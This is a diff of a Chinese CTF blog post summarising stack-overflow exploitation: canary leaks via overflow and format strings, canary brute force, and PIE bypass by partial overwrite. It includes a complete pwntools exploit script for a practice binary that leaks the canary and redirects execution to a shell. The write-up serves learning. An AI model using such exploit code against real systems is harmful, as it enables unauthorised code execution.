@@ -28,7 +28,9 @@
 <meta property="og:image" content="http://yoursite.com/img/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/3.jpg">
 <meta property="og:image" content="http://yoursite.com/img/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/4.jpg">
 <meta property="og:image" content="http://yoursite.com/img/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/5.jpg">
-<meta property="og:updated_time" content="2020-02-09T06:34:39.731Z">
+<meta property="og:image" content="http://yoursite.com/img/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/6.jpg">
+<meta property="og:image" content="http://yoursite.com/img/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/7.jpg">
+<meta property="og:updated_time" content="2020-02-12T05:20:24.552Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="栈溢出的总结">
 <meta name="twitter:description" content="已经好久没有做过栈方面的的题目了，虽然现在比赛中有关栈的题目已经越来越少了，但是这方面的功夫还是不应该落下，就乘着这这段时间把有关栈方面的知识都好好总结一下，省的到了比赛的时候碰到了又是手忙脚乱的。">
@@ -323,6 +325,7 @@
 <p>这里遇到的一个问题就是当我们进行了第一次泄露之后，当返回main函数后，不知道为什么栈上会坏掉一个字节，这点还需要后期的<br>调试来进行分析，就以后再进行解释。而且我发现别的做题者在使用和我基本相同的方式时栈就不会出现问题，真的把我的头都要气<br>掉了！！！！！！淦！！！！</p>
 <p>ps：经过调试后发现只要在送第一个payload的时候使用send而不是sendline，返回后的栈就不会坏掉，具体原因还需要进一步的<br>学习</p>
 <p>本道题还有一个不使用LibcSearcher库的解题思路，那就是利用DynELF和ret2csu这个通用gadgets，这样的话题目会变得比较复杂<br>这个通用gadgets的有关内容我会在下一篇文章中再进行介绍总结，本文就不细说了。</p>
+<hr>
 <h2 id="canary保护的bypass技巧"><a href="#canary保护的bypass技巧" class="headerlink" title="canary保护的bypass技巧"></a>canary保护的bypass技巧</h2><p>canary是一种用来防护栈溢出的保护机制。其原理是在一个函数的入口处，先从fs/gs寄存器中取出一个4字节(eax)或者8字节(rax)的值存到栈上，当函数结束时会检查这个栈上的值是否和存进去的值一致</p>
 <p>这里可以随便打开一个32位的程序来看一看</p>
 <p><img src="/img/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/4.jpg" alt="avatar"></p>
@@ -334,7 +337,23 @@
 
 <p>这里可以看到我们在送进去第一个payload之后，我们用’b’来覆盖了canary的低字节，这样就可以让字符串不被’\x00’给截断<br>从而让printf函数把canary也当成是变量给输出出来，所以接收到之后只要在减去0x62，低字节又变成了00，就是正确的<br>canary了，之后就是比较正常的rop拿到shell</p>
 <h3 id="利用格式化字符串漏洞泄露canary"><a href="#利用格式化字符串漏洞泄露canary" class="headerlink" title="利用格式化字符串漏洞泄露canary"></a>利用格式化字符串漏洞泄露canary</h3><p>同样是上面的例子，由于师兄那时候出题时的疏忽，所以这道题其实还有一个格式化字符串的漏洞。这里我们简单的计算一下偏移，<br>格式化字符串的偏移是6，再加上canary的偏移应该是25(100/4)，那就是三十一，所以输入%31$p就能够直接把canary打印出来。<br>就不进行赘述了</p>
-<p>准备有时间直接利用这个漏洞修改一下got表试一下，应该也是蛮有趣的 哈哈</p>
+<h3 id="逐位爆破canary"><a href="#逐位爆破canary" class="headerlink" title="逐位爆破canary"></a>逐位爆破canary</h3><p>这种类型的做法一般存在于当程序存在fork函数的时候，，当程序进入到子程序的时候，其canary的值和父程序的值相同，所以我<br>就可以一位一位的把canary给爆破出来。这种题目我暂时还没有做到，但是网上已经有比较详细的讲解了，等做到这类型的题目我在<br>进行补充吧</p>
+<hr>
+<h2 id="PIE机制的bypass技巧"><a href="#PIE机制的bypass技巧" class="headerlink" title="PIE机制的bypass技巧"></a>PIE机制的bypass技巧</h2><p>PIE机制真的是一生之敌，学pwn这么久一直没有对PIE机制进行一个比较完整的总结，对这一类的题目也总是敷衍了事，但事实上<br>现在的比赛中PIE出现的频率是极高的，所以深入学习一下PIE机制也是十分有必要的。</p>
+<p>那么PIE到底是什么呢?</p>
+<p>PIE中文解释为地址无关可执行文件，该技术针对的是代码段(.text),数据段(.data)以及未初始化全局变量段(.bss)。当开启了<br>这个保护后，每一次程序加载，这些地址都会发生变化，所以我们也就不能直接利用ROPgadgets等工具来进行解题。</p>
+<p>下面介绍几个比较常规的解题思路</p>
+<h3 id="partial-write"><a href="#partial-write" class="headerlink" title="partial write"></a>partial write</h3><p>这个思路利用了PIE的技术缺陷。内存使用的是页载入机制，即便开启了PIE保护，也只能影响到单页的内存，即0x1000大小<br>的内存页，这就是说不论程序如何加载，每一个指令的后三位始终不会发生变化。因此我们可以利用漏洞覆写地址的后几位来<br>控制程序流。</p>
+<p><img src="/img/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/6.jpg" alt="avatar"></p>
+<p>这是一道很基础的栈溢出，有canary，也开启了PIE保护。所以第一次输出写泄露出canary，第二次则是覆写控制程序。<br><img src="/img/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/7.jpg" alt="avatar"><br>这里需要注意的是由于本程序的代码段都很小，所以我们可以推测后门函数只有后两位和返回函数不相同,即我们只需要覆写最后<br>两个字节为‘3e’就可以了</p>
+<p>exp如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-h&apos;]</span><br><span class="line">p=process(&quot;./babypie&quot;)</span><br><span class="line">#p=remote(&quot;47.102.202.175&quot;,10004)</span><br><span class="line"></span><br><span class="line">payload=&apos;a&apos;*0x28</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;\n&quot;,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(payload)</span><br><span class="line"></span><br><span class="line">canary=u64(p.recv(8))-0xa</span><br><span class="line"></span><br><span class="line">log.info(&quot;canary:&quot;+hex(canary))#put candy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=&apos;a&apos;*0x28+p64(canary)+p64(0xdeffdeff)+&quot;\x3e&quot;#pianyiliang</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="泄露地址以及vsyscall"><a href="#泄露地址以及vsyscall" class="headerlink" title="泄露地址以及vsyscall"></a>泄露地址以及vsyscall</h3><p>这个方面的内容篇幅较大，我会在之后的文章里面重新进行梳理总结的。</p>
+<hr>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>上文介绍的就是栈溢出方面的基本的保护方式以及解题思路，这些都算是pwn题中比较基础的部分，现在在比赛中出现的也是越来<br>越少。但学习pwn总是要从基础学起嘛，囫囵吞枣总归没有脚踏实地来的好。</p>
+<p>之后还会陆续总结一些栈溢出方面的骚操作以及比较实用的小技巧。总结完这一波就又要开始撸堆了，太痛苦了…….</p>
+<p>冲冲冲！！！</p>
 
       
     </div>
@@ -346,7 +365,7 @@
         <p><span>本文标题:</span><a href="/2020/02/08/栈溢出的总结/">栈溢出的总结</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">HeZhaochen</a></p>
         <p><span>发布时间:</span>2020-02-08, 13:29:03</p>
-        <p><span>最后更新:</span>2020-02-09, 14:34:39</p>
+        <p><span>最后更新:</span>2020-02-12, 13:20:24</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2020/02/08/栈溢出的总结/" title="栈溢出的总结">http://yoursite.com/2020/02/08/栈溢出的总结/</a>
             <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2020/02/08/栈溢出的总结/　　作者: HeZhaochen" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
@@ -376,7 +395,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#简单的ret2libc"><span class="toc-number">1.</span> <span class="toc-text">简单的ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#canary保护的bypass技巧"><span class="toc-number">2.</span> <span class="toc-text">canary保护的bypass技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#栈溢出泄露canary"><span class="toc-number">2.1.</span> <span class="toc-text">栈溢出泄露canary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用格式化字符串漏洞泄露canary"><span class="toc-number">2.2.</span> <span class="toc-text">利用格式化字符串漏洞泄露canary</span></a></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#简单的ret2libc"><span class="toc-number">1.</span> <span class="toc-text">简单的ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#canary保护的bypass技巧"><span class="toc-number">2.</span> <span class="toc-text">canary保护的bypass技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#栈溢出泄露canary"><span class="toc-number">2.1.</span> <span class="toc-text">栈溢出泄露canary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用格式化字符串漏洞泄露canary"><span class="toc-number">2.2.</span> <span class="toc-text">利用格式化字符串漏洞泄露canary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#逐位爆破canary"><span class="toc-number">2.3.</span> <span class="toc-text">逐位爆破canary</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PIE机制的bypass技巧"><span class="toc-number">3.</span> <span class="toc-text">PIE机制的bypass技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#partial-write"><span class="toc-number">3.1.</span> <span class="toc-text">partial write</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#泄露地址以及vsyscall"><span class="toc-number">3.2.</span> <span class="toc-text">泄露地址以及vsyscall</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结"><span class="toc-number">4.</span> <span class="toc-text">小结</span></a></li></ol>
         
     </div>
     <style>
